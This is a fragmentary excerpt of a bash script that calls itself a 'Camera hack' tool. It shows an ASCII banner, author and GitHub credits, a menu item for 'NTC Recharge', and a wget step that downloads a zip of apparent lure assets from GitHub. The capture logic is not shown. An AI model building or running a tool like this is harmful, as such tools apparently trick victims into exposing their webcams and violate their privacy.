...
# Logo 
logo="    
${red}  _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
${red} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
${red} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
${red} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
${red} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
${green}                                               [Camera hack by Vision KC]
"
...
trap "echo -e '\n${success}Thanks for Using! Visit : https://github.com/vision-dev1 \n'; exit" 2
...
${red}[${white}1${red}] ${cyan}NTC Recharge
...
$red[Author]     ${cyan} :[VISION KC]
$red[Github]     ${cyan} :[https://github.com/vision-dev1]"
printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/vision-dev1"
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/vision-dev1/files/raw/main/${dir}.zip"
